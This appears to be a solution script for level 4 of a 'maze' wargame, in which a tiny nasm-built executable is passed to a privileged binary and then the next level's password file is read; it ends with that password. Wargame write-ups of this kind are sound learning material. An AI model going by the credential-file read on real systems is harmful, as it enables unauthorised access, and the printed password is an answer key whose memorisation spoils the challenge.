#!/bin/bash
# maze4 will check executable file's size and smt
# if it's smaller than 128 bytes, and match the condition, it will execute it
# so we need to create a shellcode that is smaller than 128 bytes and matches the condition
# how to make small executable file -> https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
mkdir /tmp/ballban_maze4; cd /tmp/ballban_maze4

nano tiny.asm
nasm -f bin -o shellcode tiny.asm 
chmod +x shellcode
/maze/maze4 shellcode

cat /etc/maze_pass/maze5
# password: fobwgnzRy0